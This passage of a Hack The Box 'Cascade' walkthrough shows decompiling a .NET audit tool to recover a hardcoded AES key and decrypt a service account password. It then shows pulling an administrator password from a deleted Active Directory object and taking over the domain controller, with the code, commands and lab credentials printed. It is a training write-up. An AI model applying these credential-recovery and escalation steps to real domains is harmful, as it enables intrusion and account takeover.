+getting file \x64\SQLite.Interop.dll of size 1639936 as SQLite.Interop.dll (457.7 KiloBytes/sec) (average 269.9 KiloBytes/sec)
+Get directory x86? y
+Get file SQLite.Interop.dll? y
+getting file \x86\SQLite.Interop.dll of size 1246720 as SQLite.Interop.dll (422.0 KiloBytes/sec) (average 309.8 KiloBytes/sec)
+</code></pre>
+
+<p>First thing, an SQLite database</p>
+
+<pre><code class="language-bash">$ file Audit.db 
+Audit.db: SQLite 3.x database, last written using SQLite version 3027002
+</code></pre>
+
+<p>Using SQLite Browser, the file can be opened. The <code>DeletedUserAudit</code> table contains entries related to the previously seen deleted users. The LDAP table contains the login information of the account used by the service, <code>ArcSvc</code> !</p>
+
+<pre><code class="language-bash">id | uname  | pwd                      | domain
+1  | ArkSvc | BQO5l5Kj9MdErXx6Q6AGOw== | cascade.local
+</code></pre>
+
+<p>The password is encrypted. From there, it reminds me another compromised box&hellip; Nest =).
+The service probably uses the database information to connect to the domain. Thus, it must use a function to decrypt the password.</p>
+
+<p>It turns out that the binary is written in <code>C# (.NET)</code>. Perfect! This will make things much easier&hellip; &ldquo;Reverse&rdquo; time!</p>
+
+<pre><code class="language-bash">$ file CascAudit.exe 
+CascAudit.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
+</code></pre>
+
+<p>I used <code>dnSpy</code> to decompile the application. Overall, it&rsquo;s easier it looks at first glance.
+In the <code>main</code>, we can see the little piece of code used for decryption and authentication.</p>
+
+<pre><code class="language-bash">sqliteDataReader.Read();
+str = Conversions.ToString(sqliteDataReader[&quot;Uname&quot;]);
+str2 = Conversions.ToString(sqliteDataReader[&quot;Domain&quot;]);
+string encryptedString = Conversions.ToString(sqliteDataReader[&quot;Pwd&quot;]);
+try
+{
+  password = Crypto.DecryptString(encryptedString, &quot;c4scadek3y654321&quot;);
+}
+catch (Exception ex)
+{
+  Console.WriteLine(&quot;Error decrypting password: &quot; + ex.Message);
+  return;
+}
+</code></pre>
+
+<p>It then calls the decryption function, using an hardcoded key&hellip; Smells good huh ?
+We can then get the decryption function.</p>
+
+<pre><code class="language-bash">public static string DecryptString(string EncryptedString, string Key)
+    {
+      byte[] array = Convert.FromBase64String(EncryptedString);
+      Aes aes = Aes.Create();
+      aes.KeySize = 128;
+      aes.BlockSize = 128;
+      aes.IV = Encoding.UTF8.GetBytes(&quot;1tdyjCbY1Ix49842&quot;);
+      aes.Mode = CipherMode.CBC;
+      aes.Key = Encoding.UTF8.GetBytes(Key);
+      string @string;
+      using (MemoryStream memoryStream = new MemoryStream(array))
+      {
+        using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Read))
+        {
+          byte[] array2 = new byte[checked(array.Length - 1 + 1)];
+          cryptoStream.Read(array2, 0, array2.Length);
+          @string = Encoding.UTF8.GetString(array2);
+        }
+      }
+      return @string;
+    }
+</code></pre>
+
+<p>We are therefore able to decrypt our password, by slightly manipulating the code!
+Being a noob, I didn&rsquo;t try to patch the binary (And above all, I was lazy and I knew another method).</p>
+
+<p>In the same way as for the <code>Nest</code> machine, the <a href="https://dotnetfiddle.net">https://dotnetfiddle.net</a> website is going to be a great help!
+We simply integrate the decryption function in a small program and display the value of the decrypted password</p>
+
+<pre><code class="language-bash">using System;
+using System.IO;
+using System.Security.Cryptography;
+using System.Text;
+          
+public class Program
+{
+  public static void Main()
+  {
+    Console.WriteLine(&quot;Hello World&quot;);
+    Console.WriteLine(DecryptString(&quot;BQO5l5Kj9MdErXx6Q6AGOw==&quot;, &quot;c4scadek3y654321&quot;));
+  }
+  public static string DecryptString(string EncryptedString, string Key)
+    {
+      byte[] array = Convert.FromBase64String(EncryptedString);
+      Aes aes = Aes.Create();
+      aes.KeySize = 128;
+      aes.BlockSize = 128;
+      aes.IV = Encoding.UTF8.GetBytes(&quot;1tdyjCbY1Ix49842&quot;);
+      aes.Mode = CipherMode.CBC;
+      aes.Key = Encoding.UTF8.GetBytes(Key);
+      string @string;
+      using (MemoryStream memoryStream = new MemoryStream(array))
+      {
+        using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Read))
+        {
+          byte[] array2 = new byte[checked(array.Length - 1 + 1)];
+          cryptoStream.Read(array2, 0, array2.Length);
+          @string = Encoding.UTF8.GetString(array2);
+        }
+      }
+      return @string;
+    }
+}
+</code></pre>
+
+<p>And then, the result !</p>
+
+<pre><code class="language-bash">Hello World
+w3lc0meFr31nd
+</code></pre>
+
+<p><br/></p>
+
+<h3 id="privilege-escalation-through-arksvc">Privilege escalation through <code>ArkSvc</code></h3>
+
+<p><code>ArkSvc</code> also being member of the <code>Remote Management Users</code>group, wen can use it to connect through WinRM.</p>
+
+<pre><code class="language-bash">$ ruby winrm_shell_arksvc.rb 
+PS &gt; whoami 
+cascade\arksvc
+PS &gt; pwd
+
+Path                     
+----                     
+C:\Users\arksvc\Documents
+</code></pre>
+
+<p>From there, the privilege escalation is quite simple. Looking at all the elements already seen and the information retrieved during the enumeration phase, we know that the <code>ArkSvc</code> user controls the service used for audit and domain account deletion (<code>Recycle Bin</code>).</p>
+
+<p>Some research on the Internet teaches that when the <code>Recycle Bin</code> service is activated, it is possible to restore deleted objects. But it is also possible to recover information associated with deleted objects. The following resource (<a href="https://www.lepide.com/how-to/restore-deleted-objects-in-active-directory.html">https://www.lepide.com/how-to/restore-deleted-objects-in-active-directory.html</a>) gives all the necessary information.</p>
+
+<p>Thus, the following command displays the deleted objects.</p>
+
+<pre><code class="language-bash">PS &gt; Get-ADObject -Filter {SamAccountName -eq 'TempAdmin'} -IncludeDeletedObjects -Properties *
+
+
+accountExpires                  : 9223372036854775807
+badPasswordTime                 : 0
+badPwdCount                     : 0
+CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
+                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
+CN                              : TempAdmin
+                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+codePage                        : 0
+countryCode                     : 0
+Created                         : 1/27/2020 3:23:08 AM
+createTimeStamp                 : 1/27/2020 3:23:08 AM
+Deleted                         : True
+Description                     : 
+DisplayName                     : TempAdmin
+DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
+dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
+givenName                       : TempAdmin
+instanceType                    : 4
+isDeleted                       : True
+LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
+lastLogoff                      : 0
+lastLogon                       : 0
+logonCount                      : 0
+Modified                        : 1/27/2020 3:24:34 AM
+modifyTimeStamp                 : 1/27/2020 3:24:34 AM
+msDS-LastKnownRDN               : TempAdmin
+Name                            : TempAdmin
+                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                  : 
+ObjectClass                     : user
+ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
+objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
+primaryGroupID                  : 513
+ProtectedFromAccidentalDeletion : False
+pwdLastSet                      : 132245689883479503
+sAMAccountName                  : TempAdmin
+sDRightsEffective               : 0
+userAccountControl              : 66048
+userPrincipalName               : TempAdmin@cascade.local
+uSNChanged                      : 237705
+uSNCreated                      : 237695
+whenChanged                     : 1/27/2020 3:24:34 AM
+whenCreated                     : 1/27/2020 3:23:08 AM
+</code></pre>
+
+<p>Did you see it ? ;)
+AS for the first user, a <code>cascadeLegacyPwd</code> is defined for <code>TempAdmin</code>. The password can also be gathered.
+L&rsquo;avez vous vu ? ;)</p>
+
+<pre><code class="language-bash">$ echo &quot;YmFDVDNyMWFOMDBkbGVz&quot; | base64 -d 
+baCT3r1aN00dles%                                        
+</code></pre>
+
+<p>And.. Compromised ! Huh ?
+Remember, the HTML note to the internal IT group specifying that the temporary account had the same password as the administrator account&hellip;
+Well, we then modify the ruby script to include the password, and log in with the <code>administrator</code> account.</p>
+
+<pre><code class="language-bash">$ ruby winrm_shell_admin.rb 
+PS &gt; hostname
+CASC-DC1
+PS &gt; whoami
+cascade\administrator
+</code></pre>
+
+<p>w00ted !</p>
+  </div>
+  
+
+<div class="post--navigation post--navigation-single">
+    
+    <a href="/en/walkthroughs/hackthebox/sauna/" class="post--navigation-prev">
+      <i aria-hidden="true" class="fa fa-chevron-left"></i>
+      <span class="navigation-tittle">Hack The Box - Sauna</span>
+    </a>
+    
+    
+    <a href="/en/walkthroughs/hackthebox/remote/" class="post--navigation-next">
+      <span class="navigation-tittle">Hack The Box - Remote</span>
+      <i aria-hidden="true" class="fa fa-chevron-right"></i>
+    </a>
+    
+</div>
+
+
+  
+
+  
+    
+
+
+</article>
+
+
+        </div>
+        
+    
+  
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-126182747-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+<script defer src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"
+  integrity="sha384-4oV5EgaV02iISL2ban6c/RmotsABqE4yZxZLcYMAdG7FAPsyHYAPpywE9PJo+Khy"
+  crossorigin="anonymous">
+</script>
+
+
+    
+        
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+        
+        <script type="text/javascript">
+            hljs.configure({languages: []});
+            hljs.initHighlightingOnLoad();
+        </script>
+        
+        
+
+
+
+    
+
+
+
+    </body>
+</html>
